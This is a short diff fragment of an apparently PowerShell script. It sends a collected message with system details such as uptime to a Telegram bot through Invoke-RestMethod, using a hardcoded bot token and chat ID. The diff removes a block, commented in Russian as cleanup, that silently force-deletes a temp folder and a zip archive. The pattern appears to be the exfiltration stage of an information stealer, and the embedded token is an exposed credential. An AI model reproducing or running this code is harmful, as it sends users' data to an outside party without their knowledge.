@@ -374,7 +374,3 @@ Uptime: $uptimeInfo
 "@
 
 Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{chat_id='5674514050'; text=$msg}
-
-# Очистка
-Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
-Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
